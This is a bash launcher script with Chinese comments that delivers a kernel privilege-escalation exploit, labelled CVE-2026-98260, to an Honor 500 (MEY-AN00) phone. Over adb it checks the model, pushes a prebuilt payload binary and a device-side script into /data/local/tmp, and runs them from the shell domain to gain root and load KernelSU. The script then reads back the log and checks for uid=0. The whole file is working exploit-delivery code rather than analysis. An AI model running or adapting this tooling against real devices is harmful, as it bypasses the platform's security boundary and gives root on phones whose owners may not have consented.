#!/usr/bin/env bash
# ============================================================
# PC 侧一键投放器：荣耀500 MEY-AN00 / CVE-2026-98260
#
# 用法（在 PC 上，设备已开 USB 调试）：
#     sh onefire.sh
# 或不用 PC：把本目录整个拷到 /sdcard/ksu98260/，在 Shizuku 终端执行
#     sh /sdcard/ksu98260/run.sh
#
# 硬门槛：设备型号 MEY-AN00、内核 release 精确匹配、shell(uid=2000) 域、
#         tracefs 可读、已装 KernelSU Manager。全部由设备侧 run.sh 自检。
# ============================================================
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
RD=/data/local/tmp/ksu98260
PAYLOAD="$HERE/cve-2026-98260-uid0"
RUNSH="$HERE/run.sh"

[ -f "$PAYLOAD" ] || { echo "[STOP] 缺少 payload: $PAYLOAD"; exit 1; }
[ -f "$RUNSH" ]   || { echo "[STOP] 缺少设备侧脚本: $RUNSH"; exit 1; }

echo "==> [1/4] 等待设备"
adb wait-for-device
DEV="$(adb shell getprop ro.product.device 2>/dev/null | tr -d '\r')"
echo "    设备型号: ${DEV:-unknown}"
if [ -n "$DEV" ] && [ "$DEV" != "MEY-AN00" ]; then
    echo "[STOP] 机型不是 MEY-AN00。本项目只针对荣耀 500，跨机型偏移不可复用。"
    exit 1
fi

echo "==> [2/4] 投放 payload + 脚本到 $RD"
adb shell "mkdir -p $RD"
adb push "$PAYLOAD" "$RD/cve-2026-98260-uid0" >/dev/null
adb push "$RUNSH"   "$RD/run.sh" >/dev/null
adb shell "chmod 755 $RD/cve-2026-98260-uid0"

echo "==> [3/4] 在 shell(2000) 域执行（adb shell sh）"
echo "    ⚠ 一 boot 一发；成功后不要 kill 驻留进程，回滚只能重启。"
echo ""
adb shell sh "$RD/run.sh"

echo ""
echo "==> [4/4] 取回日志"
adb shell "cat $RD/run.log" 2>/dev/null || true
echo ""
echo "判据（独立透镜）：id 为 uid=0(root)、/proc/modules 出现 kernelsu、su -c id 返回 uid=0。"
echo "payload 自报的 KSU_LOADED / ROOT_SUCCESS 不作唯一依据。"
